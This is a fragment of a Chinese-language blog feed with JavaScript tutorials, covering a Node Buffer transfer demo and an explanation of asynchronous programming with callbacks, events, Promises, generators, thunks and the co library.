class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> hello = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">1000</span>; i++)&#123;</span><br><span class="line">hello += <span class="string">'h'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> Buffer(hello);</span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">res.writeHead(<span class="number">200</span>);</span><br><span class="line">res.end(buf);</span><br><span class="line">&#125;).listen(<span class="number">8008</span>);</span><br></pre></td></tr></table></figure></p><p>再看看结果:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/fastR.png" alt="fast"></p><p>可见通过二进制数据传输传输速率快得多，耗时较少。</p><p><strong>之后会基于二进制数据操作对canvas图形图像处理，音乐可视化等等内容进行总结。敬请期待</strong></p><p><strong>我们可以看到，前端知识体系是如此庞大，每个知识点都有许多内容，要hold住实属不易，但是我想只要我们有兴趣，有一颗最求卓越的心，我们就能做到最好的自己的。</strong></p><p><strong>里约奥运已经在今天落幕，感谢运动员们带给我们的难忘时刻，最让我难忘的是中国女排姑娘们，永不放弃，顽强拼搏的精神，在coding过程中，我们也要发扬这种精神，不是吗？</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;二进制数据的处理在开发中是非常普遍和重要的，文件I/O,网络I/O，HTML5 Canvas/WebGL,音频数据的处理等等，这些不管是从性能上考虑，还是对数据的精确处理上来考虑，二进制数据接口都是非常重要的。&lt;/p&gt;
&lt;p&gt;ArrayBuffer是Js操作二进制数据的接口，到后来加入到了es6的标准，Blob对象存储原始数据，相当于是ArrayBuffer数据的超集，XHR二级提供了FormData来完成表单数据提交，并且还支持Blob对象的上传，我们可以用以文件上传，而Nodejs的Buffer作为js和C++结合模块，相当于对ArrayBuffer的封装以更加方便的进行二进制数据的操作。&lt;/p&gt;
&lt;p&gt;本文就一些遇到的问题进行总结。将会涉及上述相关知识&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文章目录&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;字节序问题&lt;/li&gt;
&lt;li&gt;编码问题&lt;/li&gt;
&lt;li&gt;客户端发送FormData（文件上传）&lt;/li&gt;
&lt;li&gt;node向客户端发送ArrayBuffer&lt;/li&gt;
&lt;li&gt;综合实例&lt;/li&gt;
&lt;li&gt;性能测试
    
    </summary>
    
      <category term="HTML5" scheme="http://luoxia.me/code/categories/HTML5/"/>
    
    
      <category term="二进制数据操作" scheme="http://luoxia.me/code/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%93%8D%E4%BD%9C/"/>
    
  </entry>
  
  <entry>
    <title>异步编程解决方案</title>
    <link href="http://luoxia.me/code/2016/08/17/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/"/>
    <id>http://luoxia.me/code/2016/08/17/异步编程解决方案/</id>
    <published>2016-08-17T09:20:50.000Z</published>
    <updated>2017-11-16T13:10:06.491Z</updated>
    
    <content type="html"><![CDATA[<p>我们碰到的最简单的异步解决方案便是回调函数了，回调函数用起来比较简单，但是经常会遇到诸如下面实例的情况：</p><p><strong>jq先后执行的动画</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#div1'</span>).animate(&#123;<span class="attr">width</span>:<span class="string">"300"</span>&#125;,<span class="number">3000</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="string">'#div2'</span>).animate(&#123;<span class="attr">top</span>:<span class="string">"200px"</span>&#125;,<span class="number">2000</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="string">'#div3'</span>).animate(&#123;<span class="attr">left</span>:<span class="string">"100px"</span>&#125;,<span class="number">2000</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">$(<span class="string">'#div4'</span>).animate...</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p><strong>服务端渲染</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fs.readFile(template_path,<span class="string">'utf-8'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,template</span>)</span>&#123;</span><br><span class="line">db.query(sql,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">l10n.get(<span class="function"><span class="keyword">function</span>(<span class="params">err,resources</span>)</span>&#123;</span><br><span class="line">render(template,data,resources);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>可见，当有多个异步调用来共同完成一个任务时，会出现函数嵌套过深的情况，使得程序难以阅读和管理。再一点就是，回调函数的写法并不适合我们线性的思维方式，我们需要用同步的写法来完成异步调用。</p><p><strong>文章目录</strong></p><ol><li>回调函数</li><li>事件相关（事件监听，事件订阅/发布模式)</li><li>Promise</li><li>协程(generator)控制流程，包括generator与thunk函数，generator与promise</li><li>终极解决方案:async</li><li>流程控制库</li></ol><a id="more"></a><p>这个世界上不存在所谓回调函数深度嵌套的问题。 —— Jackson Tian</p><p>世界上本没有嵌套回调，写得人多了，也便有了}}}}}}}}}}}}。 —— fengmk2</p><h3 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h3><p>js作为一门非常灵活的语言，其本身有可以有许多种编程范式，而函数式编程也是其中一种，函数作为js的一等公民发挥了巨大的作用力，函数式编程在异步编程中起着重要的作用，本文并不会对函数式编程进行详细总结（这是之后文章的事儿)，只是对一些生僻不常用而本文用到的函数式编程术语进行描述。</p><p>js的异步实现方式就是回调函数，回调函数作为异步操作的第二个阶段传入调用方法。如事件处理程序，ajax调用结果对应的回调，文件读取的回调等。</p><p>Node中的异步操作的回调函数第一个参数为err是由于异步的实现原理（上一篇文章）即事件驱动，异步操作的第一个阶段会立即返回，等到数据读取完成供事件循环调用执行第二阶段的回调，但是出于这两段之间发生的错误将无法捕获，就只好把错误作为第一个参数传递。</p><p>正如开头所述，回调函数的问题便是回调地狱和非线性的表达方式。</p><h3 id="事件相关"><a href="#事件相关" class="headerlink" title="事件相关"></a>事件相关</h3><h4 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h4><p>这个在DOM编程中很常见:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//TODO</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>DOM解析完毕触发ready事件，执行回调</p><h4 id="发布-订阅模式"><a href="#发布-订阅模式" class="headerlink" title="发布/订阅模式"></a>发布/订阅模式</h4><p>publish/subscribe模式是js基于事件驱动机制的类似于观察者模式的实现，虽然两种设计模式都有发布者和观察者，但是观察者模式是具体的目标对象调用观察者的update方法，发布/订阅模式则是有一个消息发布中心，利用事件驱动，订阅者执行事件处理程序来订阅和接收发布者的通知，实际上还是一种事件监听的方式。</p><h5 id="jquery中的发布-订阅模式实现"><a href="#jquery中的发布-订阅模式实现" class="headerlink" title="jquery中的发布/订阅模式实现"></a>jquery中的发布/订阅模式实现</h5><p><strong>自定义事件</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#btn'</span>).on(<span class="string">'myevent'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;...&#125;);<span class="comment">//订阅myevent事件</span></span><br><span class="line">$(<span class="string">'#btn'</span>).trigger(<span class="string">'myevent,'</span>hello<span class="string">');//发布事件</span></span><br></pre></td></tr></table></figure></p><p><strong>pub/sub插件</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jQuery.pubsub.subscribe(<span class="string">'c49.filter.change'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">topic, msg</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//Do something on filter change</span></span><br><span class="line">&#125;);</span><br><span class="line">jQuery.pubsub.publish(<span class="string">'c49.filter.change'</span>, &#123;</span><br><span class="line">    <span class="string">"action"</span>:<span class="string">"add"</span>,</span><br><span class="line">    <span class="string">"filter"</span>:&#123;<span class="string">"value"</span>:<span class="number">1</span>,<span class="string">"label"</span>:<span class="string">"The price filter"</span>&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h5 id="nodeJS的核心模块event"><a href="#nodeJS的核心模块event" class="headerlink" title="nodeJS的核心模块event"></a>nodeJS的核心模块event</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> event = <span class="built_in">require</span>(<span class="string">'event'</span>);</span><br><span class="line"><span class="keyword">let</span> emitter = <span class="keyword">new</span> events.EventEmitter();</span><br><span class="line">emmitter.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;...&#125;);<span class="comment">//订阅</span></span><br><span class="line">emmitter.emit(<span class="string">'data'</span>,<span class="string">'hhhh'</span>);<span class="comment">//发布</span></span><br></pre></td></tr></table></figure><p>实际上就是提供了自定义事件的功能。</p><h3 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h3><h4 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h4><p>Promise最早出现在Dojo框架中，jquery1.5以后版本有Promise/Deferred对象：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">let</span> dtd = $.Deferred();</span><br><span class="line"><span class="keyword">var</span> tasks = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">　　　　　　alert(<span class="string">"执行完毕！"</span>);</span><br><span class="line">　　　　　　dtd.resolve(); <span class="comment">// 改变deferred对象的执行状态</span></span><br><span class="line">　　　　&#125;;</span><br><span class="line">　　setTimeout(tasks,<span class="number">5000</span>);</span><br><span class="line"><span class="keyword">return</span> dtd.promise();</span><br><span class="line">&#125;</span><br><span class="line">$.when(add()).done(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;...&#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;...&#125;);</span><br></pre></td></tr></table></figure></p><p>$.when()接受deferred对象返回promise对象，promise对象不能改变状态，add方法内部调用dtd的promise()方法返回promise对象可以防止外部改变其状态。done,fail,progress都返回promise对象，方便链式调用。</p><p>后来Promise/Deferred模式也被加入了CommonJS规范当中。</p><h4 id="ES2015标准"><a href="#ES2015标准" class="headerlink" title="ES2015标准"></a>ES2015标准</h4><p>Promise对象最终被写入了ES2015标准，使得我们可以不用再写深层嵌套的回调了,以readFile为例：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> readFile = <span class="function"><span class="keyword">function</span>(<span class="params">fileName</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve,reject</span>)</span>&#123;</span><br><span class="line">fs.readFile(fileName,<span class="string">'utf-8'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(error)&#123;</span><br><span class="line">reject(error);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">resolve(data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line">readFile(<span class="string">'./fileA.txt'</span>)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span>(<span class="params">data1</span>)</span>&#123;...&#125;)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> readFile(<span class="string">'./fileB.txt'</span>);&#125;)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span>(<span class="params">data2</span>)</span>&#123;...&#125;)</span><br><span class="line">.catch(<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;...&#125;);</span><br></pre></td></tr></table></figure></p><p>这样回调嵌套变成了一连串的then()了，这样符合了同步的写法，流程比较清晰，但是这样写还是会造成过多的then，代码量也很大。另外如果我们的多个异步操作互相依赖，后面的操作依赖前面操作返回的结果，光靠promise是比较难实现的。这就要说到后面的generator函数了。</p><p>promise.all()可实现多个异步任务同时执行，提供程序效率，具体的这里就不详解了。</p><h3 id="协程控制流程"><a href="#协程控制流程" class="headerlink" title="协程控制流程"></a>协程控制流程</h3><h4 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h4><p>协程可由单线程和多线程语言实现，单线程里由多个函数实现，多个线程（函数）可以并行执行，但是只有一个线程（函数）处于运行状态，其他都处于暂停状态。js里的协程实现方式是generator函数，协程的执行权只能由generator函数的调用者才能将执行权交还给generator函数。</p><h4 id="generator函数"><a href="#generator函数" class="headerlink" title="generator函数"></a>generator函数</h4><p>generator函数是es6提供的一种js协程实现方式，内部就相当于状态机，<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">asyncJob</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...其他代码</span></span><br><span class="line">  <span class="keyword">var</span> f = <span class="keyword">yield</span> readFile(fileA);</span><br><span class="line">  <span class="comment">// ...其他代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>上面的asyncJob就是协程实现，yield命令表示执行到此处，执行权交给其他协程，协程遇到yield命令就暂停，等到执行权返回，再从暂停的地方继续往后执行。它的最大优点，就是代码的写法非常像同步操作，如果去除yield命令，简直一模一样。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">loadUI</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  showLoadingScreen();</span><br><span class="line">  <span class="keyword">yield</span> loadUIDataAsynchronously();<span class="comment">//异步的加载UI</span></span><br><span class="line">  hideLoadingScreen();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> loader = loadUI();</span><br><span class="line"><span class="comment">// 加载UI</span></span><br><span class="line">loader.next()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载UI</span></span><br><span class="line">loader.next()</span><br></pre></td></tr></table></figure><p>上面例子loader为一个遍历器，每次调用next()都会一直执行直到遇到yield语句。上面的卸载UI就相当于异步的加载UI后执行的回调函数。这样就不用写回调函数了，就实现了异步的同步表达，更符合我们的线性思维。</p><p>generator函数另外一个功能就是可以向generator内部输入值，yiled语句本身没有返回值，但是遍历器在调用next()方法时可以传入参数作为上一个yield的返回值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">yield</span> <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> b = <span class="keyword">yield</span> a+<span class="number">3</span>;</span><br><span class="line"><span class="built_in">console</span>.log(b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> t = test();</span><br><span class="line">t.next(); <span class="comment">//[5,false]</span></span><br><span class="line">t.next(<span class="number">5</span>);<span class="comment">//[8,false]</span></span><br><span class="line">t.next(<span class="number">8</span>);<span class="comment">//8</span></span><br></pre></td></tr></table></figure><p>为什么讲到这一点儿呢，这对我们的流程控制非常有用，还记得上面的promise吗，我们后面的异步依赖前面操作的数据，yield就可以做到这一点。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>* <span class="title">longRunningTask</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> value1 = <span class="keyword">yield</span> step1();</span><br><span class="line">    <span class="keyword">var</span> value2 = <span class="keyword">yield</span> step2(value1);</span><br><span class="line">    <span class="keyword">var</span> value3 = <span class="keyword">yield</span> step3(value2);</span><br><span class="line">    <span class="keyword">var</span> value4 = <span class="keyword">yield</span> step4(value3);</span><br><span class="line">    <span class="comment">// Do something with value4</span></span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="comment">// Handle any error from step1 through step4</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后我们就需要一个自动执行器，将前一个操作的返回值输入到generator函数内部了。有哪些方式来实现这个自动执行器呢？</p><p>generator和thunk函数</p><p>generator和promise</p><h4 id="thunk函数"><a href="#thunk函数" class="headerlink" title="thunk函数"></a>thunk函数</h4><p>编译器的”传名调用”实现，往往是将参数放到一个临时函数之中，再将这个临时函数传入函数体。这个临时函数就叫做Thunk函数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">m</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> m * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(x + <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> thunk = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> x + <span class="number">5</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">thunk</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> thunk() * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>js中的thunk函数是指将多参数的函数变为只接受回调函数为参数的函数，这和偏函数类似，只是这里指定最后的参数是回调函数而已。</p><p>thunk转换器示例:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Thunk = <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> fn.call(<span class="keyword">this</span>, ...args, callback);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> readFile = Thunk(fs.readFile);</span><br><span class="line">readFile(fileA)(callback);</span><br></pre></td></tr></table></figure></p><p>上例将readFile转换为了thunk函数，这样调用readFile就不会立即执行，而是需要等待传入callback来调用。</p><p>node有一个thunkify模块可直接将函数转换为thunk函数<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> thunkify = <span class="built_in">require</span>(<span class="string">'thunkify'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> read = thunkify(fs.readFile);</span><br><span class="line">read(<span class="string">'package.json'</span>)(<span class="function"><span class="keyword">function</span>(<span class="params">err, str</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h4 id="generator和thunk函数实现流程控制"><a href="#generator和thunk函数实现流程控制" class="headerlink" title="generator和thunk函数实现流程控制"></a>generator和thunk函数实现流程控制</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//基于thunk函数和generator函数的流程控制</span></span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> thunkify = <span class="built_in">require</span>(<span class="string">'thunkify'</span>);</span><br><span class="line"><span class="keyword">var</span> readFile = thunkify(fs.readFile); <span class="comment">//将fs.readFile thunk化</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> gen = fn();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = gen.next(data); <span class="comment">//交还执行权给generator函数,并将上一个异步操作的结果作为yield语句的返回值，这样可以在generator函数中处理结果。</span></span><br><span class="line">    <span class="keyword">if</span> (result.done) <span class="keyword">return</span>;</span><br><span class="line">    result.value(next);<span class="comment">//result.value是返回的一个函数(thunk函数)，接受一个回调函数作为参数</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  next();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> g = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> f1 = <span class="keyword">yield</span> readFile(<span class="string">'fileA'</span>);</span><br><span class="line">  <span class="comment">//process(f1);这里可以处理结果</span></span><br><span class="line">  <span class="keyword">var</span> f2 = <span class="keyword">yield</span> readFile(<span class="string">'fileB'</span>);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">var</span> fn = <span class="keyword">yield</span> readFile(<span class="string">'fileN'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">run(g);</span><br></pre></td></tr></table></figure><h4 id="generator和promise实现流程控制"><a href="#generator和promise实现流程控制" class="headerlink" title="generator和promise实现流程控制"></a>generator和promise实现流程控制</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> readFile = <span class="function"><span class="keyword">function</span> (<span class="params">fileName</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    fs.readFile(fileName, <span class="function"><span class="keyword">function</span>(<span class="params">error, data</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (error) <span class="keyword">return</span> reject(error);</span><br><span class="line">      resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> gen = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> f1 = <span class="keyword">yield</span> readFile(<span class="string">'/etc/fstab'</span>);</span><br><span class="line">  <span class="keyword">var</span> f2 = <span class="keyword">yield</span> readFile(<span class="string">'/etc/shells'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(f1.toString());</span><br><span class="line">  <span class="built_in">console</span>.log(f2.toString());</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">gen</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> g = gen();</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = g.next(data);</span><br><span class="line">    <span class="keyword">if</span> (result.done) <span class="keyword">return</span> result.value;</span><br><span class="line">    result.value.then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">      next(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  next();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">run(gen);</span><br></pre></td></tr></table></figure><p>我们这已经实现了异步的同步化表达，解决了回调深度嵌套的问题，但是我们不得不自己写自动执行器，多麻烦，有一个模块叫co,可以不用自己写自动执行器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gen = <span class="function"><span class="keyword">function</span>* (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> f1 = <span class="keyword">yield</span> readFile(<span class="string">'/etc/fstab'</span>);</span><br><span class="line">  <span class="keyword">var</span> f2 = <span class="keyword">yield</span> readFile(<span class="string">'/etc/shells'</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(f1.toString());</span><br><span class="line">  <span class="built_in">console</span>.log(f2.toString());</span><br><span class="line">&#125;;</span><br><span class="line">co(gen).then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span 